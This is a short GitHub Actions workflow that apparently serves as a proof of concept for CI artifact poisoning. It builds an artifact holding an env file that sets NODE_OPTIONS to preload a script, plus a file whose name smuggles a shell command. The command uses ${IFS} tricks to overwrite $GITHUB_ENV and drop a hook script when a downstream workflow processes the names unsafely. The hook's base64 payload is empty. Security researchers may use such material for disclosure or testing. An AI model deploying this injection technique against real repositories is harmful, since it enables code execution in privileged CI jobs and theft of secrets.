name: Test

on:
  pull_request:

jobs:
  content:
    runs-on: ubuntu-latest
    steps:
      - name: craft artifact
        run: |
          mkdir -p /tmp/content
          echo "attacker report" > /tmp/content/r
          printf 'NODE_OPTIONS=--require=./h.js\n' > /tmp/content/envfile
          python3 - <<'PY'
          import base64
          open('/tmp/content/hook.js','wb').write(base64.b64decode(''))
          open('/tmp/content/r;D=$(dirname${IFS}$(mktemp));S=${D%tmp};B=$D${S}content${S}contentdefault;cp${IFS}$B${S}envfile${IFS}$GITHUB_ENV;cp${IFS}$B${S}hook.js${IFS}h.js;true;#.txt', 'w').write('x\n')
          PY
      - name: upload artifact
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: contentdefault
          path: /tmp/content
          if-no-files-found: error
